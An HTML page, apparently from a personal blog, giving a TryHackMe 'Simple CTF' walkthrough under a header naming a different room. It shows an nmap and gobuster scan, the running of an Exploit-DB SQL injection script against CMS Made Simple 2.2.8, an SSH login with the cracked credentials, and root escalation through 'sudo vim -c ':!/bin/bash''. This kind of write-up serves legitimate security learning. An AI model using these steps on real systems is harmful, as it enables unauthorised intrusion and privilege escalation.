@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Try Hack Me - CC Pen testing :: atomloop — TryHackMe, HackTheBox, Vulnhub,  CTF Writeups</title>    
+  
+
+<link rel="canonical" href="https://atomloop.github.io/posts/hashes/" />
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/style.css">
+
+
+<link rel="shortcut icon" href="https://atomloop.github.io/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+<span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+<polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    <li><a href="/about">About</a></li>
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+     <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+      <li><a href="/archive">Archive</a></li>
+  </ul>
+
+
+
+  <ul class="menu__inner menu__inner--mobile">      
+    <li><a href="/about">About</a></li>       
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+    <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+     <li><a href="/archive">Archive</a></li>
+ </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">Try Hack Me - CC Pen testing </h4>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Tuesday, Aug 18, 2020
+        </span>
+      
+      <span class="post-author">— Written by atomloop</span>
+      
+        <span class="post-read-time">— 11 min read</span>
+
+    
+         <img src="https://atomloop.github.io/image/tryhackme/pentesting/cover.png" class="post-cover center" />
+
+
+         <table>
+          <thead>
+            <tr>
+              <td>Room Name</td>
+              <td>CC: Pen Testing</td>
+            </tr>
+          </thead>
+          <tbody>
+             <tr>
+               <td>Room Type</td>
+               <td> WalkThroughs</td>
+             </tr>
+           </tbody>
+           <tbody>
+             <tr>
+               <td>Room Code </td>
+               <td>ccpentesting</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Points </td>
+               <td>936</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Dificulty </td>
+               <td>Easy</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td> Room Created by </td>
+               <td><a href="https://tryhackme.com/p/Paradox">paradox</a></td>
+             </tr>
+           </tbody>
+        </table>
+</div>   
+<body><article id="988d6463-5de5-4d32-a3e1-ce16c9e9c0d1" class="page sans"><header><h1 class="page-title">Simple CTF</h1><table class="properties"><tbody></tbody></table></header><div class="page-body"><p id="38a5d436-e7ba-4989-b8e9-2d3a2fa45ddb" class="">Welcome friends for another  simple Beginner Level CTF . After Deploying Machine just do a default scripts scan ,  </p><pre id="fe01a30f-3465-4911-82f6-2e6fb5435823" class="code"><code>nmap -sC -sV  -p 80,21,2222 10.10.204.44
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 05:04 BST
+Nmap scan report for 10.10.204.44
+Host is up (0.78s latency).
+
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#x27;t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.35.132
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  tcpwrapped
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  tcpwrapped
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.82 seconds</code></pre><p id="9b4eb855-78e9-4a9c-a63b-aad164b3e1eb" class="">
+</p><p id="420b8304-763e-49fd-b2ef-f0cad0c7ed68" class="">There are 3 ports(21,80,2222) are open 2 ports are under 1000 . there is some  services running on unusual  port 2222  let&#x27;s look at this port later  .  lets go and check common  port 80 .   </p><p id="2c7e4bff-be72-4d91-b4ee-742816995c63" class=""> </p><figure id="bb9446cb-14ff-48a0-9d4e-acd7cda1e6c2" class="image"><a href="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled.png"><img style="width:929px" src="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled.png"/></a></figure><p id="10f1f1d9-3c0d-4c90-966d-df0cc603e65d" class="">we got index page , nothing interesting in this page . lets do some directory search </p><pre id="99304fe4-1ae5-4dea-9eec-61839f2c3071" class="code"><code>
+└──╼ $gobuster dir -u http://10.10.204.44/ -w /usr/share/wordlists/dirb/small.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.204.44/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/15 05:24:45 Starting gobuster
+===============================================================
+[ERROR] 2020/09/15 05:26:19 [!] Get http://10.10.204.44/monitor: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/09/15 05:26:19 [!] Get http://10.10.204.44/mount: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/09/15 05:26:19 [!] Get http://10.10.204.44/mp3: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+/simple (Status: 301)
+===============================================================
+2020/09/15 05:27:01 Finished</code></pre><p id="6dd2ea8a-d3ef-4bd6-af16-da73395d1f5a" class="">
+</p><p id="f46f1027-c877-45a8-937c-eb1c2aac03f8" class="">
+</p><p id="f04fa0d0-2251-433c-b6fc-69144a05300c" class="">we got some directory name simple replay from gobuster . lets see  weather we can find any interesting thing there .  its a webpage made up of  using CMS  . at the corner we can find the version of CMS  its version is 2.2.8 .  lets do some google search weather this  version is vulnerable or not  </p><p id="f3763f4a-29e8-43bf-b67d-b1e91d3c73f1" class="">  </p><figure id="4f05f0b9-9495-4996-bdc2-329acd6bb0f7" class="image"><a href="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%201.png"><img style="width:1489px" src="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%201.png"/></a></figure><p id="4df2cbcd-e5a5-4318-a084-e31d32dc2118" class="">
+</p><p id="55082e6d-cc05-4d0f-a0d2-1f24d3d10080" class="">what we guessed is Right, it is a vulnerable to SQL injection , lets try to <a href="https://www.exploit-db.com/exploits/46635">exploit</a>  </p><p id="1edac112-0c90-44f3-8d00-05cd962df616" class="">
+</p><figure id="370873da-7d5d-487a-ba76-d19d65c781fc" class="image"><a href="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%202.png"><img style="width:873px" src="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%202.png"/></a></figure><p id="5f9d2f5a-9115-47f3-b382-bff6e61a927f" class="">
+</p><p id="a1da760f-bffd-4c86-8d5d-e76b1926a94c" class="">just i copied the exploitable  python code from Exploit-DB  and saved it in the  file name <a href="http://cmssimple.py">cmssimple.py</a>  , and also i changer permission to -X  because  we are going to execute this payload  </p><p id="5706945f-0168-4119-8662-e2cdac8fc400" class="">
+</p><pre id="fe8694eb-baf6-4d5e-9396-2b5b20d24c57" class="code"><code>[user@parrot-virtual]─[~]
+└──╼ $mkdir THM
+┌─[user@parrot-virtual]─[~]
+└──╼ $cd THM/
+┌─[user@parrot-virtual]─[~/THM]
+└──╼ $touch cmssimple.py
+┌─[user@parrot-virtual]─[~/THM]
+└──╼ $chmod 777 cmssimple.py 
+┌─[user@parrot-virtual]─[~/THM]
+└──╼ $vim cmssimple.py</code></pre><figure id="6ccd0f0e-8bea-4aff-a511-82379eb85aec" class="image"><a href="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%203.png"><img style="width:1191px" src="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%203.png"/></a></figure><p id="41a75edd-cf25-4cd9-8c42-48d0ff566af6" class="">
+</p><p id="67c8bf96-9246-443b-b295-a113e43d8cc0" class="">make sure that python , pip , are installed and required modules  are imported . during exploit we need   pass the parameter  —url , —wordlist , —crack . here i used wordlist which is mentioned  on the hint on challenge number  <strong>#4</strong> . lets try to exploit </p><pre id="ea85af1d-7a7a-4cf8-b60d-3ed4360dc30a" class="code"><code>[user@parrot-virtual]─[~/THM]
+└──╼ $python cmssimple.py --url http://10.10.204.44/simple --wordlist /usr/share/wordlists/dirb/others/best110.txt --crack</code></pre><p id="7c70a65f-eed7-4f7e-a9e7-597b66c9cb13" class=""> </p><p id="9914e28b-7d42-4b67-97b3-ae382217cdcd" class="">
+</p><p id="febd58fc-ae6a-4b10-b6db-39e174a9d7bc" class="">
+</p><p id="986f4833-8bfb-49d6-95e3-15c19fa120da" class="">
+</p><p id="39bb8698-cbf4-4fd0-96d2-2e8e8d64d688" class="">
+</p><p id="6752bfb9-81cb-425e-8eef-790cb80ef73b" class="">
+</p><p id="f3a55604-1c73-4f5d-b72d-0481ad7f44f1" class="">
+</p><p id="82021f6f-3f96-437b-bfac-4113419f8585" class="">Now we got username and password  using this information we can try to log in  SSH  on port number 2222 we found earlier </p><pre id="28600a7b-6b80-431b-b2d2-7a43f4c51418" class="code"><code>┌─[user@parrot-virtual]─[~/THM]
+└──╼ $ssh mitch@10.10.204.44 -p 2222 
+The authenticity of host &#x27;[10.10.204.44]:2222 ([10.10.204.44]:2222)&#x27; can&#x27;t be established.
+ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;[10.10.204.44]:2222&#x27; (ECDSA) to the list of known hosts.
+mitch@10.10.204.44&#x27;s password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt
+G00d##################!
+
+
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$</code></pre><p id="94105332-5a89-485e-b98d-0d4262d599ad" class="">
+</p><p id="a963df22-fa74-4472-ac80-7e629ee1da14" class="">there is a another user  called sunbath .   while searching any permissions set to user mitch   <code>sudo -l</code> we have permission to run vim without password . using this privilege there is a chance  to leverage  spawn a privileged shell. <a href="https://gtfobins.github.io/gtfobins/vim/">gtfobins</a> is a great place to do that . </p><p id="144d1b04-d6bc-4b21-9172-8b5a1689b66f" class="">
+</p><figure id="ad9e9395-915d-4fe9-8e8d-70572a197551" class="image"><a href="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%204.png"><img style="width:1577px" src="Simple%20CTF%20bb9446cb14ff48a09d4eacd7cda1e6c2/Untitled%204.png"/></a></figure><pre id="c920451c-eac9-4053-b136-33a5c88fe7bc" class="code"><code>$ id      
+uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
+$ which bash
+/bin/bash
+$ sudo vim -c &#x27;:!/bin/bash&#x27;
+
+root@Machine:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Machine:~#</code></pre><p id="5aa83b65-5e0d-420c-b60b-59c0c4c4f07c" class="">
+</p><p id="6160c15b-be22-4d98-912f-1690bd06e23a" class="">we are currently in mitch user , mitch user have permission to run vim without password , there is a feature in vim , we can execute a command for example </p><p id="8904488a-33b1-484a-8750-f7caaab37700" class="">  </p><pre id="220d373c-54ea-410b-b5b3-4ceb18734ac1" class="code"><code>$vim -c pwd</code></pre><p id="e550e9a1-327b-4d84-b41d-d484903ea29f" class=""> <code>-c </code>tells vim to run the following <code>pwd</code> command , if you run this command it will print current working directory ,  so using this method we can call /bin/bash using sudo  . on result we spawn a shell. </p><pre id="1758318d-04fd-4e60-9b44-ba053a1376e0" class="code"><code>root@Machine:/# cd root/
+root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt 
+W3ll d0n#################</code></pre></div></article>
+
+
+  </div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 atomloop</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://atomloop.github.io/assets/main.js"></script>
+<script src="https://atomloop.github.io/assets/prism.js"></script>
+
+
+
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
+</div>
+
+
+
+</body>
+</html>
